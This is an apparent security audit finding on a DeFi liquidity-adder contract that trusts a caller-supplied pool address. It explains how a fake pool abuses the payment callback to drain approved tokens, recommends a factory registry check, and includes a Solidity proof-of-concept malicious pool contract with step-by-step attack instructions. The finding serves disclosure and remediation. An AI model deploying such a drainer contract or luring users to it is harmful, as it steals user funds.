### Title
Unverified Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens — (`metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address in every public entry point without verifying it against the factory registry. A malicious contract posing as a pool can exploit the callback settlement flow to pull up to `maxAmountToken0`/`maxAmountToken1` of any tokens the victim has approved to the adder.

---

### Finding Description

Every public liquidity entry point (`addLiquidityExactShares`, `addLiquidityWeighted`) forwards the caller-supplied `pool` address directly into `_addLiquidity` without any factory membership check. [1](#0-0) 

The NatSpec on the contract explicitly acknowledges the gap:

> *"This contract does not verify the pool against the factory; a malicious pool can request token pulls up to the caller-provided max caps during callback settlement."* [2](#0-1) 

Inside `_addLiquidity`, the unverified `pool` address is stored as the **expected callback caller** in transient storage, then called: [3](#0-2) 

When the malicious pool calls back `metricOmmModifyLiquidityCallback`, the guard `msg.sender != expectedPool` passes because the malicious pool **is** the stored expected pool: [4](#0-3) 

The callback then trusts `IMetricOmmPool(msg.sender).getImmutables()` to obtain token addresses, and calls `pay(token0/token1, payer, msg.sender, amount)` — transferring tokens from the victim to the malicious pool: [5](#0-4) 

The factory exposes `isPool(address)` which returns `poolToIdx[pool] != 0`, providing a ready-made registry check that is never called here: [6](#0-5) 

---

### Impact Explanation

A victim who has approved `MetricOmmPoolLiquidityAdder` for token0 and/or token1 (required for normal use) can have up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 drained in a single transaction. The malicious pool also controls the token addresses returned by `getImmutables()`, so it can target **any** token the victim has approved to the adder — not just the pool's native pair. This is a direct loss of user principal with no recovery path.

---

### Likelihood Explanation

Any unprivileged attacker can deploy a malicious contract implementing `IMetricOmmPoolActions` and `IMetricOmmPool`. The victim only needs to be directed to call `addLiquidityExactShares` or `addLiquidityWeighted` with the malicious address — a realistic phishing or front-end injection vector. Users who have pre-approved the adder (the normal usage pattern) are permanently at risk until they revoke approvals.

For `addLiquidityWeighted`, the attack is especially clean: the malicious pool's `addLiquidity` reverts with `LiquidityProbe(need0, need1)` during the probe phase (matching the expected revert selector), causing the adder to compute scaled shares and proceed to the paying phase, where the drain occurs. [7](#0-6) 

---

### Recommendation

Add a factory membership check at the top of `_addLiquidity` (or in each public entry point):

```solidity
// metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol
function _addLiquidity(address pool, ...) internal returns (...) {
    if (!IMetricOmmPoolFactory(FACTORY).isPool(pool)) revert NotAFactoryPool();
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    ...
}
```

The factory address should be stored as an immutable in the constructor (analogous to how `MetricOmmSimpleRouter` stores it via `MetricOmmSwapRouterBase`). [8](#0-7)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {IMetricOmmPoolActions} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPoolActions.sol";
import {IMetricOmmPool, PoolImmutables} from "@metric-core/interfaces/IMetricOmmPool/IMetricOmmPool.sol";
import {IMetricOmmPoolLiquidityAdder} from "metric-periphery/contracts/interfaces/IMetricOmmPoolLiquidityAdder.sol";
import {LiquidityDelta} from "@metric-core/types/PoolOperation.sol";

contract MaliciousPool {
    address immutable adder;
    address immutable victimToken; // any token victim approved to adder
    address immutable attacker;

    constructor(address _adder, address _victimToken, address _attacker) {
        adder = _adder;
        victimToken = _victimToken;
        attacker = _attacker;
    }

    // Called by MetricOmmPoolLiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Callback with max amounts; callbackData must decode to KIND_PAY (== 1)
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            MAX0, MAX1, abi.encode(uint8(1))
        );
        return (MAX0, MAX1);
    }

    // Called by callback to get token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = victimToken; // drain any approved token
        imm.token1 = address(0);
        // ... other fields zero
    }

    uint256 constant MAX0 = 1_000_000e18; // up to victim's maxAmountToken0
    uint256 constant MAX1 = 0;
}

// Attack:
// 1. Deploy MaliciousPool(adder, victimToken, attacker)
// 2. Victim calls adder.addLiquidityExactShares(maliciousPool, victim, 0, deltas, 1_000_000e18, 0, "")
//    (or attacker tricks victim's front-end into doing so)
// 3. adder stores maliciousPool as expectedPool, calls maliciousPool.addLiquidity(...)
// 4. maliciousPool calls back metricOmmModifyLiquidityCallback(1_000_000e18, 0, abi.encode(1))
// 5. msg.sender == expectedPool ✓, amount <= max ✓
// 6. adder calls pay(victimToken, victim, maliciousPool, 1_000_000e18)
// 7. 1_000_000e18 victimToken transferred from victim to maliciousPool
``` [9](#0-8)
